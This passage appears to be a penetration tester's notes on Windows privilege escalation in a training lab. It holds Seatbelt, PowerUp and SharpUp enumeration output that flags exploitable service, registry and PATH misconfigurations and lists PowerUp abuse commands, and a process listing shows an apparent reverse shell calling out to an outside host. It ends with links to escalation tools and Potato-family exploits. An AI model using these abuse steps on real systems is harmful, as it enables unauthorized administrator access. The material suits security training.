                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v0.2.0         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,                                                                                 



=== Running System Triage Checks ===



=== Basic OS Information ===

  Hostname                      :  WIN-QBA94KB3IOF
  Domain Name                   :  
  Username                      :  WIN-QBA94KB3IOF\user
  ProductName                   :  Windows Server 2019 Standard Evaluation
  EditionID                     :  ServerStandardEval
  ReleaseId                     :  1809
  BuildBranch                   :  rs5_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  ProcessorCount                :  1
  IsVirtualMachine              :  False
  BootTime (approx)             :  1/31/2021 5:46:44 PM
  HighIntegrity                 :  False
  IsLocalAdmin                  :  False


=== Reboot Schedule (event ID 12/13 from last 15 days) ===

  1/31/2021 8:54:41 AM    :  startup


=== Current Privileges ===

                          SeShutdownPrivilege:  DISABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED


=== UAC System Policies ===

  ConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries
  EnableLUA                      : 1
  LocalAccountTokenFilterPolicy  : 1
    [*] LocalAccountTokenFilterPolicy set to 1.
    [*] Any local account can be used for lateral movement.
  FilterAdministratorToken       : 


=== PowerShell Settings ===

  PowerShell v2 Version          : 2.0
  PowerShell v5 Version          : 5.1.17763.1

  Transcription Settings:

  Module Logging Settings:

  Scriptblock Logging Settings:



=== Audit Settings ===



=== WEF Settings ===



=== LSA Settings ===

  auditbasedirectories           : 0
  auditbaseobjects               : 0
  Bounds                         : System.Byte[]
  crashonauditfail               : 0
  fullprivilegeauditing          : System.Byte[]
  LimitBlankPasswordUse          : 1
  NoLmHash                       : 1
  Security Packages              : ""
  Notification Packages          : rassfm,scecli
  Authentication Packages        : msv1_0
  LsaPid                         : 768
  LsaCfgFlagsDefault             : 0
  SecureBoot                     : 1
  ProductType                    : 7
  disabledomaincreds             : 0
  everyoneincludesanonymous      : 0
  forceguest                     : 0
  restrictanonymous              : 0
  restrictanonymoussam           : 1


=== User Environment Variables ===

  COMPUTERNAME                        : WIN-QBA94KB3IOF
  USERPROFILE                         : C:\Users\user
  HOMEPATH                            : \Users\user
  LOCALAPPDATA                        : C:\Users\user\AppData\Local
  PSModulePath                        : C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
  PROCESSOR_ARCHITECTURE              : AMD64
  Path                                : C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;;C:\Temp;C:\Users\user\AppData\Local\Microsoft\WindowsApps;
  CommonProgramFiles(x86)             : C:\Program Files (x86)\Common Files
  ProgramFiles(x86)                   : C:\Program Files (x86)
  PROCESSOR_LEVEL                     : 6
  LOGONSERVER                         : \\WIN-QBA94KB3IOF
  PATHEXT                             : .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  HOMEDRIVE                           : C:
  SystemRoot                          : C:\Windows
  SESSIONNAME                         : RDP-Tcp#0
  ALLUSERSPROFILE                     : C:\ProgramData
  DriverData                          : C:\Windows\System32\Drivers\DriverData
  APPDATA                             : C:\Users\user\AppData\Roaming
  PROCESSOR_REVISION                  : 4f01
  USERNAME                            : user
  CommonProgramW6432                  : C:\Program Files\Common Files
  CommonProgramFiles                  : C:\Program Files\Common Files
  CLIENTNAME                          : userdragon
  OS                                  : Windows_NT
  USERDOMAIN_ROAMINGPROFILE           : WIN-QBA94KB3IOF
  PROCESSOR_IDENTIFIER                : Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
  ComSpec                             : C:\Windows\system32\cmd.exe
  PROMPT                              : $P$G
  SystemDrive                         : C:
  TEMP                                : C:\Users\user\AppData\Local\Temp\2
  ProgramFiles                        : C:\Program Files
  NUMBER_OF_PROCESSORS                : 1
  TMP                                 : C:\Users\user\AppData\Local\Temp\2
  ProgramData                         : C:\ProgramData
  ProgramW6432                        : C:\Program Files
  windir                              : C:\Windows
  USERDOMAIN                          : WIN-QBA94KB3IOF
  PUBLIC                              : C:\Users\Public


=== System Environment Variables ===

  ComSpec                             : C:\Windows\system32\cmd.exe
  DriverData                          : C:\Windows\System32\Drivers\DriverData
  OS                                  : Windows_NT
  Path                                : C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;;C:\Temp
  PATHEXT                             : .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  PROCESSOR_ARCHITECTURE              : AMD64
  PSModulePath                        : C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
  TEMP                                : C:\Windows\TEMP
  TMP                                 : C:\Windows\TEMP
  USERNAME                            : SYSTEM
  windir                              : C:\Windows
  NUMBER_OF_PROCESSORS                : 1
  PROCESSOR_LEVEL                     : 6
  PROCESSOR_IDENTIFIER                : Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
  PROCESSOR_REVISION                  : 4f01


=== User Folders ===

  Folder                                Last Modified Time
  C:\Users\admin                      : 6/5/2020 8:36:24 AM
  C:\Users\Administrator              : 6/4/2020 6:12:00 PM
  C:\Users\user                       : 6/5/2020 8:38:06 AM


=== Non Microsoft Services (via WMI) ===

  Name             : AmazonSSMAgent
  DisplayName      : Amazon SSM Agent
  Company Name     : 
  Description      : Amazon SSM Agent
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
  IsDotNet         : False

  Name             : AWSLiteAgent
  DisplayName      : AWS Lite Guest Agent
  Company Name     : Amazon Inc.
  Description      : AWS Lite Guest Agent
  State            : Running
  StartMode        : Auto
  PathName         : C:\Program Files\Amazon\XenTools\LiteAgent.exe
  IsDotNet         : False

  Name             : daclsvc
  DisplayName      : DACL Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\DACL Service\daclservice.exe"
  IsDotNet         : False

  Name             : dllsvc
  DisplayName      : DLL Hijack Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
  IsDotNet         : False

  Name             : filepermsvc
  DisplayName      : File Permissions Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\File Permissions Service\filepermservice.exe"
  IsDotNet         : False

  Name             : PsShutdownSvc
  DisplayName      : PsShutdown
  Company Name     : Systems Internals
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : C:\Windows\PSSDNSVC.EXE
  IsDotNet         : False

  Name             : regsvc
  DisplayName      : Insecure Registry Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
  IsDotNet         : False

  Name             : ssh-agent
  DisplayName      : OpenSSH Authentication Agent
  Company Name     : 
  Description      : Agent to hold private keys used for public key authentication.
  State            : Stopped
  StartMode        : Disabled
  PathName         : C:\Windows\System32\OpenSSH\ssh-agent.exe
  IsDotNet         : False

  Name             : unquotedsvc
  DisplayName      : Unquoted Path Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
  IsDotNet         : False

  [X] Exception: The path is not of a legal form.


=== HKCU Internet Settings ===

        DisableCachingOfSSLPages : 1
              IE5_UA_Backup_Flag : 5.0
                 PrivacyAdvanced : 1
                 SecureProtocols : 2688
                      User Agent : Mozilla/4.0 (compatible; MSIE 8.0; Win32)
           CertificateRevocation : 1
            ZonesSecurityUpgrade : System.Byte[]
              WarnonZoneCrossing : 1
                 EnableNegotiate : 1
                    MigrateProxy : 1
                     ProxyEnable : 0


=== HKLM Internet Settings ===

                    ActiveXCache : C:\Windows\Downloaded Program Files
              CodeBaseSearchPath : CODEBASE
                  EnablePunycode : 1
                    MinorVersion : 0
                  WarnOnIntranet : 1


=== LAPS Settings ===

  [*] LAPS not installed


=== Local Group Memberships ===

  * Administrators *

    WIN-QBA94KB3IOF\Administrator
    WIN-QBA94KB3IOF\admin

  * Remote Desktop Users *

    NT AUTHORITY\Authenticated Users

  * Distributed COM Users *


  * Remote Management Users *




=== Drive Information (via .NET) ===

  Drive        Mapped Location
  C:\        : C:\


=== Current Host RDP Sessions (qwinsta) ===

  SessionID:       0
  SessionName:     Services
  UserName:        
  DomainName:      
  State:           Disconnected
  SourceIP: 

  SessionID:       1
  SessionName:     Console
  UserName:        
  DomainName:      
  State:           Connected
  SourceIP: 

  SessionID:       2
  SessionName:     RDP-Tcp#0
  UserName:        user
  DomainName:      WIN-QBA94KB3IOF
  State:           Active
  SourceIP:        10.9.132.165



=== Mapped Drives (via WMI) ===



=== Network Shares (via WMI) ===

  Name             : ADMIN$
  Path             : C:\Windows
  Description      : Remote Admin

  Name             : C$
  Path             : C:\
  Description      : Default share

  Name             : IPC$
  Path             : 
  Description      : Remote IPC



=== Firewall Rules (Deny) ===

  Current Profile(s)          : PUBLIC

  FirewallEnabled (Domain)    : False
  FirewallEnabled (Private)   : False
  FirewallEnabled (Public)    : False

  [X] Exception: Invalid namespace 


=== Process Enumerations ===

  * Potential Defensive Processes *


  * Browser Processes *


  * Other Interesting Processes *

	Name         : cmd.exe
	Product      : Command Prompt
	ProcessID    : 3888
	Owner        : WIN-QBA94KB3IOF\user
	CommandLine  : cmd



=== Registry Auto-logon Settings ===

  DefaultUserName         : admin


=== Registry Autoruns ===

  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
    C:\Windows\system32\SecurityHealthSystray.exe
    "C:\Program Files\Autorun Program\program.exe"


=== DNS Cache (via WMI) ===

  Entry         : sls.update.microsoft.com
  Name          : sls.update.microsoft.com
  Data          : sls.update.microsoft.com.akadns.net

  Entry         : sls.update.microsoft.com
  Name          : sls.update.microsoft.com.akadns.net
  Data          : sls.emea.update.microsoft.com.akadns.net

  Entry         : sls.update.microsoft.com
  Name          : sls.emea.update.microsoft.com.akadns.net
  Data          : 40.125.122.176

  Entry         : wpad
  Name          : 
  Data          : 



=== Current ARP Table ===


  Interface     : Loopback Pseudo-Interface 1 (127.0.0.1) --- Index 1
    DNS Servers : fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1

    Internet Address      Physical Address      Type
    224.0.0.22            00-00-00-00-00-00     Static


  Interface     : Ethernet (10.10.66.72) --- Index 15
    DNS Servers : 10.0.0.2

    Internet Address      Physical Address      Type
    10.10.0.1             02-C8-85-B5-5A-AA     Dynamic
    10.10.255.255         FF-FF-FF-FF-FF-FF     Static
    224.0.0.22            01-00-5E-00-00-16     Static
    224.0.0.251           01-00-5E-00-00-FB     Static
    224.0.0.252           01-00-5E-00-00-FC     Static
    255.255.255.255       FF-FF-FF-FF-FF-FF     Static


=== Active TCP Network Connections ===

  Local Address          Foreign Address        State      PID   Service         ProcessName
  0.0.0.0:135            0.0.0.0:0              LISTEN     964   RpcSs           svchost.exe
  0.0.0.0:445            0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:3389           0.0.0.0:0              LISTEN     632   TermService     svchost.exe
  0.0.0.0:5985           0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:47001          0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:49664          0.0.0.0:0              LISTEN     644                   wininit.exe
  0.0.0.0:49665          0.0.0.0:0              LISTEN     1056  EventLog        svchost.exe
  0.0.0.0:49666          0.0.0.0:0              LISTEN     824   SessionEnv      svchost.exe
  0.0.0.0:49667          0.0.0.0:0              LISTEN     1944  Spooler         spoolsv.exe
  0.0.0.0:49668          0.0.0.0:0              LISTEN     1804  PolicyAgent     svchost.exe
  0.0.0.0:49669          0.0.0.0:0              LISTEN     752                   services.exe
  0.0.0.0:49671          0.0.0.0:0              LISTEN     768                   lsass.exe
  10.10.66.72:139        0.0.0.0:0              LISTEN     4                     System
  10.10.66.72:3389       10.9.132.165:42358     ESTAB      632   TermService     svchost.exe
  10.10.66.72:49900      10.9.132.165:53        ESTAB      3224                  "C:\PrivEsc\reverse.exe" 
  10.10.66.72:49924      40.125.122.176:443     SYN_SENT   824   DsmSvc          svchost.exe


=== Active UDP Network Connections ===

  Local Address          PID    Service                 ProcessName
  0.0.0.0:123            1488   W32Time                 svchost.exe
  0.0.0.0:500            824    IKEEXT                  svchost.exe
  0.0.0.0:3389           632    TermService             svchost.exe
  0.0.0.0:4500           824    IKEEXT                  svchost.exe
  0.0.0.0:5353           1300   Dnscache                svchost.exe
  0.0.0.0:5355           1300   Dnscache                svchost.exe
  10.10.66.72:137        4                              System
  10.10.66.72:138        4                              System
  127.0.0.1:53355        824    iphlpsvc                svchost.exe


=== Non Microsoft Processes (via WMI) ===

  Name           : Seatbelt
  Company Name   : 
  PID            : 2908
  Path           : C:\PrivEsc\Seatbelt.exe
  CommandLine    : Seatbelt.exe  system
  IsDotNet       : True

  Name           : reverse
  Company Name   : 
  PID            : 3224
  Path           : C:\PrivEsc\reverse.exe
  CommandLine    : "C:\PrivEsc\reverse.exe" 
  IsDotNet       : False



[*] Completed Safety Checks in 1 seconds
```

### PowerUp.ps1
```
PS C:\PrivEsc> Invoke-AllChecks
Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...


ServiceName   : AWSLiteAgent
Path          : C:\Program Files\Amazon\XenTools\LiteAgent.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AWSLiteAgent' -Path <HijackPath>

ServiceName   : unquotedsvc
Path          : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'unquotedsvc' -Path <HijackPath>





[*] Checking service executable and argument permissions...


ServiceName    : filepermsvc
Path           : "C:\Program Files\File Permissions Service\filepermservice.exe"
ModifiableFile : C:\Program Files\File Permissions Service\filepermservice.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName 'filepermsvc'





[*] Checking service permissions...


ServiceName   : daclsvc
Path          : "C:\Program Files\DACL Service\daclservice.exe"
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -ServiceName 'daclsvc'





[*] Checking %PATH% for potentially hijackable .dll locations...


HijackablePath : C:\Temp\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Temp\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Users\user\AppData\Local\Microsoft\WindowsApps\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\user\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll' 
                 -Command '...'





[*] Checking for AlwaysInstallElevated registry key...


OutputFile    : 
AbuseFunction : Write-UserAddMSI





[*] Checking for Autologon credentials in registry...


[*] Checking for vulnerable registry autoruns and configs...


Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
Path           : "C:\Program Files\Autorun Program\program.exe"
ModifiableFile : C:\Program Files\Autorun Program\program.exe





[*] Checking for vulnerable schtask files/configs...


[*] Checking for unattended install files...


UnattendPath : C:\Windows\Panther\Unattend.xml





[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...
```

### SharpUp.exe
```
PS C:\PrivEsc> .\SharpUp.exe
.\SharpUp.exe

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Services ===

  Name             : daclsvc
  DisplayName      : DACL Service
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\DACL Service\daclservice.exe"


=== Modifiable Service Binaries ===

  Name             : filepermsvc
  DisplayName      : File Permissions Service
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\File Permissions Service\filepermservice.exe"


=== AlwaysInstallElevated Registry Keys ===

  HKLM:    1
  HKCU:    1


=== Modifiable Folders in %PATH% ===

  Modifable %PATH% Folder  : C:\Temp


=== Modifiable Registry Autoruns ===

  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run : C:\Program Files\Autorun Program\program.exe


=== *Special* User Privileges ===



=== Unattended Install Files ===

 C:\Windows\Panther\Unattend.xml


=== McAfee Sitelist.xml Files ===



=== Cached GPP Password ===

  [X] Exception: Could not find a part of the path 'C:\ProgramData\Microsoft\Group Policy\History'.


[*] Completed Privesc Checks in 0 seconds
```

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
post/multi/recon/local_exploit_suggester
post/windows/gather/enum_patches
```

Tools:
[1] winPEAS -> https://github.com/carlospolop/PEASS-ng
[2] Seatbelt -> https://github.com/GhostPack/Seatbelt
[3] PowerUp -> https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 && https://powersploit.readthedocs.io/en/latest/Privesc/
[4] SharpUp -> https://github.com/GhostPack/SharpUp
[5] windows-privsec-check -> https://github.com/pentestmonkey/windows-privesc-check
[6] Windows-Exploit-Suggester -> https://github.com/AonCyberLabs/Windows-Exploit-Suggester && && https://github.com/bitsadmin/wesng (This is a Next-Gen Windows Exploit Suggester)
[7] Windows-Kernel-Exploits -> https://github.com/SecWiki/windows-kernel-exploits
[8] WindowsEnum -> https://github.com/absolomb/WindowsEnum
[9] WinPwnage -> https://github.com/rootm0s/WinPwnage
[10] Wynis -> https://github.com/Sneakysecdoggo/Wynis
[11] JAWS (Just Another Windows (Enum) Script) -> https://github.com/411Hall/JAWS
[12] UACME -> https://github.com/hfiref0x/UACME (Cobalt Strike uses this as well)
[13] Watson -> https://github.com/rasta-mouse/Watson
[14] Sherlock -> https://github.com/rasta-mouse/Sherlock/
[15] PrivsecCheck -> https://github.com/itm4n/PrivescCheck
[16] SessionGopher -> https://github.com/Arvanaghi/SessionGopher
[17] BeRoot -> https://github.com/AlessandroZ/BeRoot
[18] Tater -> https://github.com/Kevin-Robertson/Tater
[19] p0wnedShell -> https://github.com/Cn33liz/p0wnedShell
[20] LOLBAS -> https://lolbas-project.github.io/
[21] Awesome-privilege-escalation -> https://github.com/m0nad/awesome-privilege-escalation

Exploits:
[1] RottenPotato || RottenPotatoNG -> https://github.com/antonioCoco/RoguePotato || https://github.com/breenmachine/RottenPotatoNG
[2] Potato -> https://github.com/foxglovesec/Potato && https://github.com/foxglovesec/Potato/tree/master/source/Potato/Potato/bin/Release
[3] Juicy-Potato -> https://ohpe.it/juicy-potato/ && https://github.com/decoder-it/juicy-potato

References:
https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
https://www.hackingarticles.in/window-privilege-escalation-automated-script/
https://blog.certcube.com/powerup-cheatsheet/
https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
https://pentestlab.blog/2017/04/24/windows-kernel-exploits/
https://www.hackingarticles.in/windows-kernel-exploit-privilege-escalation/


HKEY_CLASSES_ROOT (HKCR)
HKEY_CURRENT_USER (HKCU)
HKEY_LOCAL_MACHINE (HKLM)
HKEY_USERS          (HKUS)
HKEY_CURRENT_CONFIG (HKCC)
